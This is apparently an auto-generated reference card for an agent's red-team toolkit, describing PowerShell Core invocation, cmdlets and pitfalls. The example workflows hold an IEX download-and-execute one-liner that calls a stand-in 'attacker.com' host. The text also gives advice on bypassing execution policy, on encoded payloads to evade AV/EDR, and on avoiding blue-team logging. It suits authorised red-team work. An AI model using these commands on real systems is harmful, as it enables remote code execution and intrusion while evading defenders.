---
name: PowerShell
description: Cross-platform PowerShell Core 7.6.0 for automation, scripting, and
  Windows/cloud administration tasks.
registry: registry
tool_id: powershell
category: other
tags:
  - powershell
  - scripting
  - automation
  - dotnet
  - administration
  - windows
  - post-exploitation
mitre_techniques:
  - T1059.001
  - T1027
  - T1140
  - T1086
summary: "PowerShell Core (pwsh) is invoked via `/usr/bin/pwsh`. Use for:
  Windows/cloud admin automation, file system ops, service management, object
  manipulation, script execution, and post-exploitation tasks. Supports
  interactive shell mode (default), script execution (`-File`), direct command
  execution (`-Command`), and encoded/obfuscated payloads (`-EncodedCommand`).
  Key parameters: `-ExecutionPolicy Bypass` to ignore script restrictions,
  `-NoProfile` to skip user profiles, `-NonInteractive` for headless execution,
  `-WindowStyle Hidden` to avoid UI. All cmdlets follow Verb-Noun pattern (e.g.,
  Get-Process, Invoke-Command). Output is object-based, not text; pipeline with
  `|` to chain commands. Use `Get-Help <cmdlet>` and `Get-Command *keyword*` for
  discovery. Tab completion works for cmdlets and parameters. Watch for
  execution policy blocks (default: Restricted on Windows); bypass with
  `-ExecutionPolicy Bypass` or `-ExecutionPolicy Unrestricted`. Common gotchas:
  param blocks must be first line in scripts, case-insensitive but
  syntax-sensitive, constrained language mode limits .NET access when AppLocker
  is active. For opsec: encoded commands with `-EncodedCommand`, obfuscation
  tools exist but increase entropy. Cross-platform but Windows-centric cmdlets
  (Get-WmiObject, Get-Service) may fail on Linux. Ideal for credential
  harvesting prep, lateral movement scripting, recon automation, and
  living-off-the-land techniques."
sources:
  - https://www.tutorialspoint.com/powershell/powershell_quick_guide.htm
  - https://www.techtarget.com/searchwindowsserver/definition/PowerShell
  - https://www.michaelroth42.com/post/2024-04-10-getting-started-with-powershell/
  - https://www.tutorialspoint.com/powershell/index.htm
  - https://netwrix.com/en/resources/blog/powershell-scripting-tutorial/
  - https://shannonscncjdeblog.blogspot.com/2018/08/powershell-command-line-options-starter.html
  - https://ss64.com/ps/
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/powershell
  - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1
  - https://netwrix.com/en/resources/blog/powershell-commands-cheat-sheet/
  - https://redcanary.com/threat-detection-report/techniques/powershell/
  - https://adsecurity.org/?p=2921
generated_at: 2026-05-19T11:06:16.994Z
generated_by: anthropic
source_hash: 1302246426fa99f8720607ded8d552e459143d7a887f6f1165b1f8f74e3f62bb
---

# PowerShell

## Overview

PowerShell Core 7.6.0 is a cross-platform automation engine and scripting language built on .NET, designed for system administration and configuration management. Unlike text-based shells, PowerShell operates on objects, enabling rich data manipulation through pipelines. Cmdlets (command-lets) follow a strict Verb-Noun naming convention (e.g., Get-Process, Set-Location, Invoke-WebRequest). Supports both interactive shell sessions and script execution (.ps1 files). Commonly abused in red team ops for living-off-the-land attacks, credential access, lateral movement, and defense evasion via obfuscation/encoding.

## When to use

Use PowerShell when you need to: automate Windows admin tasks (user/service management, registry access, file ops); execute reconnaissance commands on Windows targets; interact with cloud platforms (Azure, AWS via modules); run encoded or obfuscated payloads to evade AV/EDR; chain complex operations using object pipelines; execute .NET code without compiling; perform bulk operations across systems; leverage built-in cmdlets for credential harvesting prep (e.g., Get-WmiObject, Get-Process); script lateral movement or persistence mechanisms. Prefer over cmd.exe for advanced scripting and object manipulation. On Linux, useful for cross-platform scripts but Windows-specific cmdlets won't work.

## Authentication & setup

No authentication required for local execution. Launch interactive shell: `/usr/bin/pwsh` (no args). For remote operations (Invoke-Command, Enter-PSSession), credentials are required and passed via `-Credential` parameter or prompted interactively. Execution policy enforcement (Windows-centric): check with `Get-ExecutionPolicy`, bypass with `pwsh -ExecutionPolicy Bypass` or `-ExecutionPolicy Unrestricted`. On fresh systems, may default to Restricted (blocks script execution). To run scripts without policy blocks: `pwsh -ExecutionPolicy Bypass -File script.ps1`. For headless/non-interactive: use `-NonInteractive` flag. If AppLocker is in Allow mode, PowerShell may run in Constrained Language Mode, limiting .NET and Add-Type usage—verify with `$ExecutionContext.SessionState.LanguageMode`. No installation needed in RTPI (already at /usr/bin/pwsh).

## Key commands / parameters

**Invocation:** `pwsh` (interactive), `pwsh -File script.ps1` (run script), `pwsh -Command "Get-Process"` (execute command). **Critical parameters:** `-ExecutionPolicy Bypass` (ignore script execution policy), `-NoProfile` (skip profile scripts for clean env), `-NonInteractive` (disable user prompts, fail on Read-Host), `-EncodedCommand <base64>` (run base64-encoded UTF-16LE command for obfuscation), `-WindowStyle Hidden` (hide window), `-NoExit` (keep shell open after command), `-NoLogo` (suppress banner). **Essential cmdlets:** `Get-Help <cmdlet>` (syntax/examples), `Get-Command *keyword*` (search cmdlets), `Get-Member` (inspect object properties), `Get-Process` (list processes), `Get-Service` (list services), `Get-ChildItem` (ls equivalent), `Set-Location` (cd equivalent), `Invoke-Command` (remote execution), `Invoke-WebRequest` (HTTP requests), `Invoke-Expression` (eval string as code), `Start-Process` (launch process), `Get-WmiObject` / `Get-CimInstance` (WMI queries), `Export-Csv` / `ConvertTo-Json` (output formatting). Use `|` for pipelines, `Where-Object {condition}` for filtering, `Select-Object` for property selection. Tab completes cmdlets and params. Up arrow cycles command history.

## Example workflows

**Recon - list running processes:** `pwsh -Command "Get-Process | Select-Object Name,Id,Path | ConvertTo-Json"`. **Execute encoded payload:** `echo 'Get-Process' | iconv -t UTF-16LE | base64 -w0` then `pwsh -EncodedCommand <base64>`. **Run script bypassing policy:** `pwsh -ExecutionPolicy Bypass -File ./scan.ps1`. **Remote command (if creds available):** `pwsh -Command "Invoke-Command -ComputerName target -Credential (Get-Credential) -ScriptBlock {Get-Service}"`. **Download and execute:** `pwsh -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')"`. **Service enumeration:** `pwsh -Command "Get-Service | Where-Object {$_.Status -eq 'Running'} | Export-Csv running.csv"`. **WMI query for system info:** `pwsh -Command "Get-WmiObject -Class Win32_OperatingSystem | Select-Object Caption,Version"`. **Obfuscated command:** encode with base64, use `-EncodedCommand`. **Script with params:** `pwsh -File upload.ps1 -filepath /tmp/data.txt -username admin -password pass`.

## Output format

PowerShell outputs structured objects, not plain text. In interactive mode, objects are formatted as tables or lists. Cmdlets like `Get-Process` return objects with properties (Name, Id, CPU, etc.). Use `Format-Table`, `Format-List`, or `ConvertTo-Json` / `ConvertTo-Csv` / `Export-Csv` to serialize. Pipeline (`|`) passes objects between cmdlets. For red team logging, pipe to `Out-File -FilePath log.txt` or `ConvertTo-Json | Out-File`. Errors appear on stderr with red text (in interactive) or as ErrorRecord objects. Verbose/debug output available with `-Verbose` / `-Debug` switches on cmdlets. When using `-Command`, output is written to stdout; capture with redirects or programmatically. Exit codes: 0 = success, non-zero = failure (check `$LASTEXITCODE`).

## Common pitfalls

**Execution policy blocks:** Default Restricted policy on Windows prevents script execution. Always use `-ExecutionPolicy Bypass` in red team context. **Constrained Language Mode:** When AppLocker is in Allow mode, PowerShell restricts .NET access. Check `$ExecutionContext.SessionState.LanguageMode`; if ConstrainedLanguage, many attack tools fail. Workaround: invoke from unmanaged process or use alternate execution methods. **Param blocks must be first line:** Script parameters via `Param()` must appear before any code, including comments. **Case sensitivity:** Cmdlets/params are case-insensitive but filesystem paths may be (Linux). **Typos in param names:** PowerShell throws ParameterBindingException for mismatched params; verify with tab completion. **Profile pollution:** User profiles (~/.config/powershell/profile.ps1) can interfere; use `-NoProfile` for clean execution. **NonInteractive hang:** If script calls `Read-Host` or confirmation prompts without `-NonInteractive`, it hangs. Always use `-NonInteractive` in automated/headless contexts. **Object vs. text:** Don't parse PowerShell object output as text (e.g., with grep); use `Where-Object`, `Select-Object` instead. **Encoded command syntax:** `-EncodedCommand` expects UTF-16LE base64, not UTF-8; wrong encoding causes garbled execution. **Logging/telemetry:** PowerShell 5+ has Script Block Logging, Transcription, and Module Logging; assume blue team sees commands unless obfuscated. **Cross-platform cmdlet gaps:** Windows-specific cmdlets (Get-WmiObject, Get-EventLog) unavailable on Linux; use Get-CimInstance or platform-agnostic alternatives.

## References

• https://www.tutorialspoint.com/powershell/powershell_quick_guide.htm
• https://www.techtarget.com/searchwindowsserver/definition/PowerShell
• https://www.michaelroth42.com/post/2024-04-10-getting-started-with-powershell/
• https://netwrix.com/en/resources/blog/powershell-scripting-tutorial/
• https://ss64.com/ps/
• https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/powershell
• https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1
• https://netwrix.com/en/resources/blog/powershell-commands-cheat-sheet/
• https://redcanary.com/threat-detection-report/techniques/powershell/
• https://adsecurity.org/?p=2921
